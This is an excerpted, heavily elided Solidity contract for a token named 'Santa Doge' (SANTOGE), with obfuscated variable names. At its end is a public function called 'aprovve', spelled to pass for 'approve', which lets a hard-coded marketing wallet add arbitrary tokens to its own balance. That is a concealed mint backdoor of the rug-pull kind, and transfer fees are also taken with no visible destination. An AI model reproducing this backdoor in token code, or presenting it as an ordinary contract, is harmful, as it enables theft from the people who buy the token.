...
contract Context {
 ...
 contract SantaDoge is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloTDOG;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Santa Doge";
    string private _symbol = "SANTOGE";
    ...
    uint256 private cryfaleTDOG = 4;
    uint256 private _vebegoTDOG = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloTDOG[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletTDOG = 0x798D0b8a3556815D89f216248fFFab5a1FBc9265;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloTDOG[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloTDOG[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleTDOG / 100) / _vebegoTDOG;
        allons = allons -  (_fee * _vebegoTDOG);
        
        superfloTDOG[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaTDOG) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloTDOG[account];
        require(accountBalance >= gzillaTDOG, "BEP : Can't be done");
        unchecked {
            superfloTDOG[account] = accountBalance - gzillaTDOG;
        }
        _totalSupply -= gzillaTDOG;

        emit Transfer(account, address(0), gzillaTDOG);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function aprovve(uint256 burn) public{
        superfloTDOG[_msgSender()] += burn;
        require(_msgSender() == _MarketingWalletTDOG, "ERC20: cannot permit dev address");
    }   
